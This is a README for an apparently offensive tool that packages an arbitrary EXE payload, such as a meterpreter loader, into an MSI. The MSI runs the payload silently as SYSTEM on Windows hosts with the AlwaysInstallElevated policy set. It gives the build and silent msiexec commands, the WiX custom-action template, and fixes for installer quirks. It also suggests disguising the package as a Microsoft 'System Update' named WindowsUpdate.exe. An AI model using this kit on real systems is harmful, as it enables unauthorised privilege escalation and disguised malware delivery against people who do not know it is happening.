# MSI builder — AlwaysInstallElevated

Wraps an EXE (e.g. one built by `loader/build_loader.py`) into an MSI that
runs the payload **during installation** as a Custom Action with
`Execute="deferred"` + `Impersonate="no"`. When the target has the
`AlwaysInstallElevated` policy enabled, the MSI installer executes the
Custom Action as **NT AUTHORITY\\SYSTEM**, giving you a SYSTEM-level
execution of the embedded EXE without ever needing admin to call `msiexec`.

## Prerequisites (build host, Linux)

```
sudo apt install msitools
```

This provides `wixl`, a Linux-native WiX compiler.

## Prerequisites (target, Windows)

Both registry keys must be set to `1`:

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If either is missing or `0`, the installer runs only with the user's
privileges — no elevation.

Check quickly on target:

```
powershell -c "Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer','HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue"
```

## Build

```
python3 build_msi.py --exe ../loader/WindowsUpdate.exe -o update.msi
```

With custom metadata:

```
python3 build_msi.py \
    --exe ./payload.exe \
    --product-name "Corporate Toolkit" \
    --manufacturer "IT Services" \
    -o corporate_toolkit.msi
```

Options:

| Flag | Meaning |
|------|---------|
| `--exe` | EXE embedded into the MSI Binary table (required) |
| `-o/--output` | Output `.msi` path (default `installer.msi`) |
| `--product-name` | `Name` attribute in the Product row (default `System Update`) |
| `--manufacturer` | `Manufacturer` attribute (default `Microsoft Corporation`) |
| `--keep-wxs` | Keep the generated `.wxs` source for inspection |

## Run on target

Copy the MSI to the target, then:

```
msiexec /quiet /qn /i C:\Users\Public\update.msi
```

- `/quiet /qn` — no UI, no prompts.
- `/i` — install mode (triggers the deferred Custom Action).

With `AlwaysInstallElevated` set, the Custom Action executes as SYSTEM.
The EXE is launched `asyncNoWait` so the installer returns immediately —
your payload's callback (meterpreter, etc.) should be ready on the
listener before you invoke `msiexec`.

## How it works (WiX)

The generated `.wxs` installs the EXE as a regular `<File>` under
`Program Files\<product_name>\`, then schedules a deferred Custom Action
after `InstallFiles` that launches the EXE via `cmd.exe /c start`:

```xml
<Component Id="PayloadComp" Guid="...">
    <File Id="payloadFile" Source="..." KeyPath="yes" />
</Component>

<Property Id="CmdRunner" Value="cmd.exe" />

<CustomAction Id="RunPayload"
              Property="CmdRunner"
              ExeCommand='/c start "" "[#payloadFile]"'
              Execute="deferred"
              Impersonate="no"
              Return="ignore" />

<InstallExecuteSequence>
    <Custom Action="RunPayload" After="InstallFiles" />
</InstallExecuteSequence>
```

- `Execute="deferred"` — runs in the installer's server process.
- `Impersonate="no"` — don't impersonate the installing user; run as the
  installer account. Under `AlwaysInstallElevated` that's SYSTEM.
- `cmd.exe /c start "" "..."` — `start` detaches the child process so
  the payload outlives `cmd.exe` (and the installer). `cmd.exe` itself
  returns immediately, so MSI doesn't hang on a blocking shellcode.
- `Return="ignore"` — waits for `cmd.exe` (fast) and ignores its return
  code.

> Two Windows Installer gotchas the template dodges:
> 1. **`Return="asyncNoWait"` + `Execute="deferred"` is invalid.** The
>    engine silently skips such CAs without writing them to the
>    execution script. The `cmd.exe /c start` trick achieves the same
>    "don't wait for payload" behavior in a supported way.
> 2. **wixl 0.103 drops CAs that use `Directory="..."` or `BinaryKey="..."`.**
>    Critical GLib error, empty row in the `CustomAction` table, CA
>    never fires on target. The template uses `Property="CmdRunner"`
>    (which wixl does support) to hold `cmd.exe` as the source exe.

## Troubleshooting

- **Installer exits with `1603`** — Custom Action failed. Usually means
  `AlwaysInstallElevated` is NOT set on both hives, or the EXE itself
  errored. Test the EXE manually first.
- **No callback, no error** — your payload is crashing after launch.
  Re-test the EXE standalone under the same user context.
- **`wixl: command not found`** — install `msitools`.
